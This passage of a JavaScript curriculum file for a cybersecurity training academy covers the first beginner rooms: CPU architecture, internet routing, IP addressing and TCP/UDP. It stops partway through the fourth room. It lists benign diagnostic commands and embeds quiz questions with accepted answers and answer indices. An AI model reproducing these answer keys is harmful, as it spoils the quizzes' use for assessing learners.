/**
 * CALION Cybersecurity Academy — Authoritative Curriculum Database (v2)
 * Complete 4-Stage, 47-Room Cybersecurity Progression Tree
 * 
 * Single source of truth for:
 * Stage 1: Pre-Security (10 Rooms)
 * Stage 2: Cyber Security Foundations (10 Rooms)
 * Stage 3: Defensive Security (12 Rooms)
 * Stage 4: Offensive Security (15 Rooms)
 * Total: 47 Comprehensive Rooms
 */

const CALION_STAGES = [
  {
    "id": "pre-security",
    "title": "Pre-Security",
    "order": 1,
    "tagline": "Foundational Computing, Networking & Command-Line",
    "description": "Essential computing architecture, network protocols, Linux/Windows operating systems, and command-line mechanics required before offensive and defensive security.",
    "icon": "shield",
    "color": "#0284c7",
    "roomCount": 10,
    "estimatedTime": "5 hr 30 min",
    "difficulty": "Beginner",
    "unlockedByDefault": true,
    "prerequisiteStageId": null
  },
  {
    "id": "cyber-security",
    "title": "Cyber Security Foundations",
    "order": 2,
    "tagline": "Core Security Principles, Threat Modeling & Defense",
    "description": "Master the core principles of cybersecurity: the CIA Triad, threat modeling, authentication architectures, applied cryptography, malware classification, and incident response frameworks.",
    "icon": "lock",
    "color": "#6366f1",
    "roomCount": 10,
    "estimatedTime": "6 hr 15 min",
    "difficulty": "Foundational",
    "unlockedByDefault": false,
    "prerequisiteStageId": "pre-security"
  },
  {
    "id": "defensive-security",
    "title": "Defensive Security",
    "order": 3,
    "tagline": "Blue Team Operations, SOC Analysis & Threat Hunting",
    "description": "Specialized defensive security training: SOC operations, Windows/Linux log analysis, Wireshark traffic inspection, SIEM detection engineering, digital forensics, and incident containment.",
    "icon": "security",
    "color": "#10b981",
    "roomCount": 12,
    "estimatedTime": "8 hr 45 min",
    "difficulty": "Intermediate",
    "unlockedByDefault": false,
    "prerequisiteStageId": "cyber-security"
  },
  {
    "id": "offensive-security",
    "title": "Offensive Security",
    "order": 4,
    "tagline": "Authorized Security Testing, Exploitation & Remediation",
    "description": "Specialized offensive security training: Rules of engagement, network reconnaissance, service enumeration, OWASP Top 10 web exploitation, privilege escalation, and executive remediation reporting.",
    "icon": "swords",
    "color": "#ef4444",
    "roomCount": 15,
    "estimatedTime": "11 hr 20 min",
    "difficulty": "Advanced",
    "unlockedByDefault": false,
    "prerequisiteStageId": "cyber-security"
  }
];

const CALION_ROOMS = [
  {
    "id": "room-01",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 1,
    "title": "Introduction to Computers",
    "description": "Understand computer hardware, CPU execution cycles, memory hierarchies, and hardware privilege rings.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "25 mins",
    "xpReward": 50,
    "prerequisites": "None",
    "whyAreYouHere": "Understand computer hardware, CPU execution cycles, memory hierarchies, and hardware privilege rings.",
    "objectives": [
      "Explain von Neumann architecture",
      "Differentiate RAM from persistent storage",
      "Understand CPU registers and caches",
      "Identify Ring 0 vs Ring 3 privileges"
    ],
    "skillsGained": [
      "Hardware Architecture",
      "Memory Hierarchy",
      "CPU Rings",
      "Syscall Interface"
    ],
    "toolsAndCommands": [
      "lscpu",
      "free -h",
      "lsblk",
      "uname -r"
    ],
    "diagramSvg": "<svg viewBox=\"0 0 600 180\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"160\" height=\"140\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"100\" y=\"45\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">CPU Core</text><rect x=\"35\" y=\"60\" width=\"130\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"100\" y=\"82\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Control Unit</text><rect x=\"35\" y=\"105\" width=\"130\" height=\"40\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"100\" y=\"130\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">ALU &amp; Registers</text><line x1=\"180\" y1=\"90\" x2=\"260\" y2=\"90\" stroke=\"#00f0ff\" stroke-width=\"3\" stroke-dasharray=\"4\"/><polygon points=\"260,86 268,90 260,94\" fill=\"#00f0ff\"/><polygon points=\"180,86 172,90 180,94\" fill=\"#00f0ff\"/><rect x=\"268\" y=\"20\" width=\"140\" height=\"140\" rx=\"8\" fill=\"#1e293b\" stroke=\"#6366f1\" stroke-width=\"2\"/><text x=\"338\" y=\"45\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Main Memory</text><rect x=\"283\" y=\"65\" width=\"110\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"338\" y=\"87\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Instructions (Code)</text><rect x=\"283\" y=\"110\" width=\"110\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"338\" y=\"132\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Data (Heap/Stack)</text><line x1=\"408\" y1=\"90\" x2=\"460\" y2=\"90\" stroke=\"#a855f7\" stroke-width=\"3\"/><polygon points=\"460,86 468,90 460,94\" fill=\"#a855f7\"/><polygon points=\"408,86 400,90 408,94\" fill=\"#a855f7\"/><rect x=\"468\" y=\"40\" width=\"110\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#a855f7\" stroke-width=\"2\"/><text x=\"523\" y=\"80\" fill=\"#c084fc\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I/O Devices</text><text x=\"523\" y=\"105\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Disk / Network</text></svg>",
    "seeExamples": [
      {
        "title": "CPU Topology & Architecture Inspection",
        "codeOrDiagram": "$ lscpu\nArchitecture:           x86_64\nCPU op-mode(s):         32-bit, 64-bit\nAddress sizes:          39 bits physical, 48 bits virtual\nByte Order:             Little Endian\nCPU(s):                 4\nModel name:             Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz",
        "explanation": "lscpu reports physical hardware structure, byte endianness, and supported register bit widths."
      }
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Von Neumann Architecture & The Execution Cycle",
        "concept": "Modern computers operate on the von Neumann model where program instructions and data share the same addressable memory. The CPU continuously cycles: Fetch from RAM into the Instruction Register, Decode opcode, and Execute inside the ALU. Buffer overflows exploit this model by overwriting the instruction pointer.",
        "whyItMatters": "Exploits alter the execution flow by controlling the instruction pointer (EIP/RIP).",
        "examples": [
          "Fetch: Read machine code at RIP into IR",
          "Decode: Translate opcode 0x90 to NOP",
          "Execute: Arithmetic logic unit computes result"
        ],
        "commands": [
          {
            "cmd": "lscpu",
            "desc": "Inspect CPU topology and hardware security flags"
          },
          {
            "cmd": "cat /proc/cpuinfo",
            "desc": "Check instruction extensions and mitigations"
          }
        ],
        "guidedExercise": "Execute lscpu to identify processor architecture and security mitigations.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-01-1",
            "type": "exact",
            "question": "Which CPU register points to the memory address of the next instruction to execute?",
            "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "Instruction Pointer",
              "program counter",
              "RIP",
              "EIP",
              "PC"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Often abbreviated as PC, or RIP/EIP in x86/x64.",
            "explanation": "The Program Counter (PC / RIP) points to the next instruction in memory."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Memory Hierarchy & Volatile Forensics",
        "concept": "Computers use a hierarchy: Registers (<1ns), L1-L3 Cache (1-10ns), RAM (60-80ns), and Persistent Storage (NVMe/SSD/HDD). Data in RAM is volatile but holds plaintext credentials, decrypted encryption keys, and active malware payloads. Live memory acquisition is essential during forensic investigation.",
        "whyItMatters": "Attackers often reside strictly in memory to bypass static disk antivirus scanners.",
        "examples": [
          "Registers: RAX, RBX, RCX directly inside CPU core",
          "RAM: Dynamic RAM holding running process pages",
          "Storage: ext4/NTFS file systems on disk"
        ],
        "commands": [
          {
            "cmd": "free -h",
            "desc": "Display memory and swap allocation"
          },
          {
            "cmd": "lsblk",
            "desc": "List block storage devices"
          }
        ],
        "guidedExercise": "Run free -h to check available physical RAM and swap space.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-01-2",
            "type": "multiple-choice",
            "question": "Why is RAM critical during incident response investigations?",
            "options": [
              "RAM is permanent and never cleared on reboot",
              "RAM contains running process memory, decrypted keys, and injected code not found on disk",
              "RAM cannot be analyzed by forensic tools",
              "RAM only contains operating system files"
            ],
            "correctIndex": 1,
            "hint": "Running programs decrypt passwords and secrets in memory.",
            "explanation": "Volatile memory contains active process artifacts, decrypted keys, and memory-only malware."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Privilege Rings & Final Knowledge Review",
        "concept": "Modern processors enforce hardware privilege rings: Ring 0 (Kernel Mode) has complete hardware control; Ring 3 (User Mode) runs user applications with restricted instructions. To access hardware or network sockets, Ring 3 apps invoke System Calls (syscalls).",
        "whyItMatters": "Privilege escalation attacks seek to elevate execution from Ring 3 to Ring 0.",
        "examples": [
          "Ring 0: Linux kernel and device drivers",
          "Ring 3: Browser, shell, user applications",
          "Syscalls: open(), read(), write(), socket()"
        ],
        "commands": [
          {
            "cmd": "id",
            "desc": "Print active user ID and group permissions"
          },
          {
            "cmd": "uname -a",
            "desc": "Print complete system kernel information"
          }
        ],
        "guidedExercise": "Run id to view your current effective UID and group memberships.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Von Neumann model, memory hierarchy, volatility, and CPU privilege rings.",
          "technicalTakeaways": "Processors enforce hardware rings; user space code cannot touch hardware without kernel system calls. RAM holds live decrypted secrets.",
          "commandsCovered": [
            "lscpu",
            "free -h",
            "lsblk",
            "uname -r",
            "id"
          ],
          "commonMistakes": "Assuming RAM is permanent or thinking user applications can directly write to raw disk sectors.",
          "learningOutcome": "You can describe physical computer components, explain how CPU privilege rings protect the operating system, and trace how code executes."
        },
        "questions": [
          {
            "id": "q-01-3",
            "type": "exact",
            "question": "What is the CPU ring number corresponding to Kernel Mode in x86 architecture?",
            "visualSlots": "_",
            "acceptedAnswers": [
              "0",
              "Ring 0",
              "Ring0"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The most privileged inner ring.",
            "explanation": "Ring 0 is the highest privilege level, reserved exclusively for the OS kernel."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-01-1",
        "type": "exact",
        "question": "Which CPU register points to the memory address of the next instruction to execute?",
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "Instruction Pointer",
          "program counter",
          "RIP",
          "EIP",
          "PC"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Often abbreviated as PC, or RIP/EIP in x86/x64.",
        "explanation": "The Program Counter (PC / RIP) points to the next instruction in memory."
      },
      {
        "id": "q-01-2",
        "type": "multiple-choice",
        "question": "Why is RAM critical during incident response investigations?",
        "options": [
          "RAM is permanent and never cleared on reboot",
          "RAM contains running process memory, decrypted keys, and injected code not found on disk",
          "RAM cannot be analyzed by forensic tools",
          "RAM only contains operating system files"
        ],
        "correctIndex": 1,
        "hint": "Running programs decrypt passwords and secrets in memory.",
        "explanation": "Volatile memory contains active process artifacts, decrypted keys, and memory-only malware."
      },
      {
        "id": "q-01-3",
        "type": "exact",
        "question": "What is the CPU ring number corresponding to Kernel Mode in x86 architecture?",
        "visualSlots": "_",
        "acceptedAnswers": [
          "0",
          "Ring 0",
          "Ring0"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The most privileged inner ring.",
        "explanation": "Ring 0 is the highest privilege level, reserved exclusively for the OS kernel."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Von Neumann Architecture & The Execution Cycle",
        "instruction": "Execute lscpu to identify processor architecture and security mitigations.",
        "hints": [
          "Often abbreviated as PC, or RIP/EIP in x86/x64."
        ]
      },
      {
        "title": "Task 2: Memory Hierarchy & Volatile Forensics",
        "instruction": "Run free -h to check available physical RAM and swap space.",
        "hints": [
          "Running programs decrypt passwords and secrets in memory."
        ]
      },
      {
        "title": "Task 3: Privilege Rings & Final Knowledge Review",
        "instruction": "Run id to view your current effective UID and group memberships.",
        "hints": [
          "The most privileged inner ring."
        ]
      }
    ],
    "nextRoomId": "room-02"
  },
  {
    "id": "room-02",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 2,
    "title": "How the Internet Works",
    "description": "Explore the global packet-switched Internet, IP routing, Autonomous Systems, and BGP peering.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-01",
    "whyAreYouHere": "Explore the global packet-switched Internet, IP routing, Autonomous Systems, and BGP peering.",
    "objectives": [
      "Differentiate packet switching from circuit switching",
      "Trace how packets traverse routers and Autonomous Systems",
      "Understand BGP peering mechanics",
      "Use traceroute and ping for path diagnosis"
    ],
    "skillsGained": [
      "Packet Switching",
      "Global Routing",
      "BGP Mechanics",
      "Path Diagnostics"
    ],
    "toolsAndCommands": [
      "ping -c 4",
      "traceroute",
      "ip route",
      "whois"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Packet Switching & The Decentralized Internet",
        "concept": "The Internet breaks messages into discrete packets with standardized IP headers and payloads. Unlike old circuit-switched telephone lines that locked a dedicated wire, packets route independently across different intermediate routers and are reassembled at the destination.",
        "whyItMatters": "Packet switching ensures network survival even if intermediate nodes or cables fail.",
        "examples": [
          "A 1 MB file splits into ~700 packets",
          "Packets take varied physical routes",
          "TCP reassembles packets using sequence numbers"
        ],
        "commands": [
          {
            "cmd": "ping -c 4 8.8.8.8",
            "desc": "Send ICMP Echo requests to verify reachability and latency"
          },
          {
            "cmd": "ip route",
            "desc": "Display local routing table"
          }
        ],
        "guidedExercise": "Use ping to measure round-trip time to a remote gateway.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-02-1",
            "type": "exact",
            "question": "What networking paradigm breaks data into chunks that route independently?",
            "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "packet switching",
              "packet-switching"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Contrasted with circuit switching.",
            "explanation": "Packet switching allows packets to traverse independent paths across the network."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Autonomous Systems & BGP Routing",
        "concept": "The Internet is a federation of over 70,000 Autonomous Systems (AS) managed by ISPs, universities, and tech enterprises. AS networks peer at Internet Exchange Points (IXPs) and exchange path reachability using the Border Gateway Protocol (BGP). Because traditional BGP lacks authentication, adversaries can perform BGP hijacking.",
        "whyItMatters": "BGP route leaks can intercept or disrupt global network traffic.",
        "examples": [
          "AS15169: Google",
          "AS13335: Cloudflare",
          "BGP prefix announcement: 'AS13335 reaches 1.1.1.0/24'"
        ],
        "commands": [
          {
            "cmd": "whois -h whois.radb.net 1.1.1.1",
            "desc": "Query routing registries for ASN info"
          },
          {
            "cmd": "traceroute -n 8.8.8.8",
            "desc": "Trace intermediate router hops"
          }
        ],
        "guidedExercise": "Run traceroute -n 8.8.8.8 to observe the sequence of router hops.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-02-2",
            "type": "exact",
            "question": "Which routing protocol is used by Autonomous Systems to exchange routing data across the Internet?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "BGP",
              "Border Gateway Protocol"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Three-letter acronym for Border Gateway Protocol.",
            "explanation": "BGP is the core routing protocol coordinating Autonomous Systems globally."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: ICMP Diagnostics & Final Knowledge Review",
        "concept": "Network diagnostics rely on the Internet Control Message Protocol (ICMP). Ping checks reachability via Echo Request/Reply. Traceroute works by sending packets with incrementing Time-To-Live (TTL) values; each router decrements TTL, and when TTL hits 0, it replies with an ICMP Time Exceeded packet, exposing its IP address.",
        "whyItMatters": "Network defenders monitor ICMP anomalies to spot network mapping and host sweeps.",
        "examples": [
          "TTL=1: First router responds",
          "TTL=2: Second router responds",
          "TTL reaches destination: Echo reply returned"
        ],
        "commands": [
          {
            "cmd": "traceroute -m 10 1.1.1.1",
            "desc": "Trace up to 10 hops toward 1.1.1.1"
          },
          {
            "cmd": "ping -c 1 127.0.0.1",
            "desc": "Verify local TCP/IP stack"
          }
        ],
        "guidedExercise": "Trace hops toward a public DNS resolver and note the latency changes.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Packet switching, Autonomous Systems (AS), BGP peering, and ICMP diagnostics.",
          "technicalTakeaways": "Packets route independently across Autonomous Systems. Routers decrement TTL; traceroute uses ICMP TTL expiration to map hops.",
          "commandsCovered": [
            "ping",
            "traceroute",
            "ip route",
            "whois"
          ],
          "commonMistakes": "Confusing packet switching with circuit switching or assuming packets all take an identical physical path.",
          "learningOutcome": "You can explain how packets traverse the global Internet, define Autonomous Systems, and use traceroute to audit network paths."
        },
        "questions": [
          {
            "id": "q-02-3",
            "type": "multiple-choice",
            "question": "How does traceroute discover intermediate router addresses?",
            "options": [
              "It asks the destination server to email a log of visited routers",
              "It sends packets with incrementing TTL values, triggering ICMP Time Exceeded packets from each hop",
              "It queries DNS for every router hostname",
              "It intercepts the local ISP's administrative password"
            ],
            "correctIndex": 1,
            "hint": "TTL decrements at each hop until it hits zero.",
            "explanation": "Traceroute increments TTL from 1 upward, causing each intermediate hop to return an ICMP Time Exceeded message."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-02-1",
        "type": "exact",
        "question": "What networking paradigm breaks data into chunks that route independently?",
        "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "packet switching",
          "packet-switching"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Contrasted with circuit switching.",
        "explanation": "Packet switching allows packets to traverse independent paths across the network."
      },
      {
        "id": "q-02-2",
        "type": "exact",
        "question": "Which routing protocol is used by Autonomous Systems to exchange routing data across the Internet?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "BGP",
          "Border Gateway Protocol"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Three-letter acronym for Border Gateway Protocol.",
        "explanation": "BGP is the core routing protocol coordinating Autonomous Systems globally."
      },
      {
        "id": "q-02-3",
        "type": "multiple-choice",
        "question": "How does traceroute discover intermediate router addresses?",
        "options": [
          "It asks the destination server to email a log of visited routers",
          "It sends packets with incrementing TTL values, triggering ICMP Time Exceeded packets from each hop",
          "It queries DNS for every router hostname",
          "It intercepts the local ISP's administrative password"
        ],
        "correctIndex": 1,
        "hint": "TTL decrements at each hop until it hits zero.",
        "explanation": "Traceroute increments TTL from 1 upward, causing each intermediate hop to return an ICMP Time Exceeded message."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Packet Switching & The Decentralized Internet",
        "instruction": "Use ping to measure round-trip time to a remote gateway.",
        "hints": [
          "Contrasted with circuit switching."
        ]
      },
      {
        "title": "Task 2: Autonomous Systems & BGP Routing",
        "instruction": "Run traceroute -n 8.8.8.8 to observe the sequence of router hops.",
        "hints": [
          "Three-letter acronym for Border Gateway Protocol."
        ]
      },
      {
        "title": "Task 3: ICMP Diagnostics & Final Knowledge Review",
        "instruction": "Trace hops toward a public DNS resolver and note the latency changes.",
        "hints": [
          "TTL decrements at each hop until it hits zero."
        ]
      }
    ],
    "nextRoomId": "room-03"
  },
  {
    "id": "room-03",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 3,
    "title": "Networking Fundamentals",
    "description": "Master Local Area Networks (LAN), MAC addresses, IPv4 vs IPv6 addressing, and subnet masks.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-02",
    "whyAreYouHere": "Master Local Area Networks (LAN), MAC addresses, IPv4 vs IPv6 addressing, and subnet masks.",
    "objectives": [
      "Differentiate Layer 2 MAC addresses from Layer 3 IP addresses",
      "Understand IPv4 32-bit dot-decimal structure and private ranges",
      "Calculate subnet masks and network boundaries",
      "Inspect network interface configurations"
    ],
    "skillsGained": [
      "Layer 2 vs Layer 3",
      "IPv4 Addressing",
      "Subnet Calculations",
      "Interface Configuration"
    ],
    "toolsAndCommands": [
      "ip addr",
      "ip link",
      "arp -a",
      "route -n"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: MAC Addresses & Layer 2 Ethernet",
        "concept": "Every Network Interface Card (NIC) possesses a globally unique 48-bit physical address called a Media Access Control (MAC) address (e.g. 00:1A:2B:3C:4D:5E). The first 24 bits represent the Organizationally Unique Identifier (OUI) assigned to the manufacturer. Within a Local Area Network (LAN), switches forward Ethernet frames based strictly on MAC addresses.",
        "whyItMatters": "Adversaries use MAC spoofing to bypass network access controls and perform ARP poisoning attacks.",
        "examples": [
          "OUI: 00:1A:2B (Manufacturer)",
          "Device Identifier: 3C:4D:5E",
          "Broadcast MAC: FF:FF:FF:FF:FF:FF"
        ],
        "commands": [
          {
            "cmd": "ip link show",
            "desc": "Display network interfaces and physical MAC addresses"
          },
          {
            "cmd": "arp -n",
            "desc": "Display local ARP cache mapping IP addresses to MAC addresses"
          }
        ],
        "guidedExercise": "Run ip link show to view your system's network interface names and MAC addresses.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-03-1",
            "type": "exact",
            "question": "How many bits are in a standard physical Ethernet MAC address?",
            "visualSlots": "_ _",
            "acceptedAnswers": [
              "48",
              "48 bits",
              "48-bit"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Six hexadecimal octets (6 x 8 bits).",
            "explanation": "A standard MAC address is 48 bits (6 bytes) long, represented as 12 hexadecimal characters."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: IPv4 Addressing & Private Ranges (RFC 1918)",
        "concept": "An Internet Protocol version 4 (IPv4) address is a 32-bit numerical label written as four octets in dot-decimal notation (e.g., 192.168.1.1). RFC 1918 defines non-routable private IP ranges reserved for local networks: 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. Network Address Translation (NAT) maps private IPs to a public IP at the router boundary.",
        "whyItMatters": "Recognizing RFC 1918 private ranges is critical for scoping internal versus external penetration tests.",
        "examples": [
          "10.0.0.0 to 10.255.255.255 (Class A private)",
          "172.16.0.0 to 172.31.255.255 (Class B private)",
          "192.168.0.0 to 192.168.255.255 (Class C private)"
        ],
        "commands": [
          {
            "cmd": "ip -br addr",
            "desc": "Show brief table of active network interfaces and IP addresses"
          },
          {
            "cmd": "hostname -I",
            "desc": "Print host IP addresses"
          }
        ],
        "guidedExercise": "Execute ip -br addr to view the local IP assigned to your interface.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-03-2",
            "type": "multiple-choice",
            "question": "Which of the following IP addresses belongs to an RFC 1918 private network range?",
            "options": [
              "8.8.8.8",
              "192.168.1.50",
              "1.1.1.1",
              "151.101.1.69"
            ],
            "correctIndex": 1,
            "hint": "Look for the common home router default subnet.",
            "explanation": "192.168.0.0/16 is explicitly defined by RFC 1918 as a private non-routable range."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Subnets & Final Knowledge Review",
        "concept": "A Subnet Mask separates the network portion of an IP address from the host portion. In CIDR notation (Classless Inter-Domain Routing), /24 indicates 24 network bits (255.255.255.0), leaving 8 bits for hosts (256 addresses, with 254 usable after subtracting network and broadcast).",
        "whyItMatters": "Subnetting restricts broadcast domains and enables defensive network segmentation.",
        "examples": [
          "IP: 192.168.1.10/24",
          "Network: 192.168.1.0",
          "Broadcast: 192.168.1.255",
          "Usable hosts: 192.168.1.1 to 192.168.1.254"
        ],
        "commands": [
          {
            "cmd": "ip route show",
            "desc": "Display local routing table and subnet scope"
          },
          {
            "cmd": "ifconfig",
            "desc": "Legacy interface configuration display"
          }
        ],
        "guidedExercise": "Calculate the number of usable hosts on a /24 subnet.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Layer 2 MAC addresses, Layer 3 IPv4 addresses, RFC 1918 private ranges, and CIDR subnet masks.",
          "technicalTakeaways": "Switches use MAC addresses locally; routers use IP addresses globally. Subnet masks define local broadcast domains.",
          "commandsCovered": [
            "ip addr",
            "ip link",
            "arp -n",
            "ip route"
          ],
          "commonMistakes": "Confusing a physical MAC address with an IP address, or forgetting to subtract 2 for usable hosts.",
          "learningOutcome": "You can inspect network interfaces, identify private vs public IP ranges, and calculate subnet capacities."
        },
        "questions": [
          {
            "id": "q-03-3",
            "type": "exact",
            "question": "How many usable host IP addresses are available on an IPv4 /24 subnet?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "254"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "2^8 minus 2 reserved addresses (network and broadcast).",
            "explanation": "A /24 subnet provides 256 addresses minus 2 reserved (network and broadcast) = 254 usable hosts."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-03-1",
        "type": "exact",
        "question": "How many bits are in a standard physical Ethernet MAC address?",
        "visualSlots": "_ _",
        "acceptedAnswers": [
          "48",
          "48 bits",
          "48-bit"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Six hexadecimal octets (6 x 8 bits).",
        "explanation": "A standard MAC address is 48 bits (6 bytes) long, represented as 12 hexadecimal characters."
      },
      {
        "id": "q-03-2",
        "type": "multiple-choice",
        "question": "Which of the following IP addresses belongs to an RFC 1918 private network range?",
        "options": [
          "8.8.8.8",
          "192.168.1.50",
          "1.1.1.1",
          "151.101.1.69"
        ],
        "correctIndex": 1,
        "hint": "Look for the common home router default subnet.",
        "explanation": "192.168.0.0/16 is explicitly defined by RFC 1918 as a private non-routable range."
      },
      {
        "id": "q-03-3",
        "type": "exact",
        "question": "How many usable host IP addresses are available on an IPv4 /24 subnet?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "254"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "2^8 minus 2 reserved addresses (network and broadcast).",
        "explanation": "A /24 subnet provides 256 addresses minus 2 reserved (network and broadcast) = 254 usable hosts."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: MAC Addresses & Layer 2 Ethernet",
        "instruction": "Run ip link show to view your system's network interface names and MAC addresses.",
        "hints": [
          "Six hexadecimal octets (6 x 8 bits)."
        ]
      },
      {
        "title": "Task 2: IPv4 Addressing & Private Ranges (RFC 1918)",
        "instruction": "Execute ip -br addr to view the local IP assigned to your interface.",
        "hints": [
          "Look for the common home router default subnet."
        ]
      },
      {
        "title": "Task 3: Subnets & Final Knowledge Review",
        "instruction": "Calculate the number of usable hosts on a /24 subnet.",
        "hints": [
          "2^8 minus 2 reserved addresses (network and broadcast)."
        ]
      }
    ],
    "nextRoomId": "room-04"
  },
  {
    "id": "room-04",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 4,
    "title": "Network Protocols and Ports",
    "description": "Demystify Layer 4 transport protocols: TCP reliable connections, the 3-Way Handshake, UDP datagrams, and standardized network ports.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-03",
    "whyAreYouHere": "Demystify Layer 4 transport protocols: TCP reliable connections, the 3-Way Handshake, UDP datagrams, and standardized network ports.",
    "objectives": [
      "Differentiate connection-oriented TCP from connectionless UDP",
      "Trace the TCP 3-Way Handshake (SYN, SYN-ACK, ACK)",
      "Memorize common standard service ports (22, 53, 80, 443)",
      "Inspect listening network sockets using ss and netstat"
    ],
    "skillsGained": [
      "TCP Mechanics",
      "UDP Characteristics",
      "Port Mapping",
      "Socket Inspection"
    ],
    "toolsAndCommands": [
      "ss -tulpn",
      "netstat -tulpn",
      "nc -zv",
      "curl -I"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: TCP vs UDP & The 3-Way Handshake",
        "concept": "At the Transport Layer (Layer 4), two primary protocols carry network data:\n- **TCP (Transmission Control Protocol):** Connection-oriented, guaranteed in-order delivery, flow control. Before sending data, TCP establishes a session via the **3-Way Handshake**: 1) Client sends SYN, 2) Server replies with SYN-ACK, 3) Client returns ACK.\n- **UDP (User Datagram Protocol):** Connectionless, lightweight, low-latency, no retransmission (fire-and-forget). Ideal for DNS, DHCP, and live video streaming.",
        "whyItMatters": "SYN Flood attacks exploit TCP handshake half-open states to exhaust server resources.",
        "examples": [
          "TCP: HTTP, SSH, FTP, HTTPS",
          "UDP: DNS queries, VoIP, DHCP, NTP",
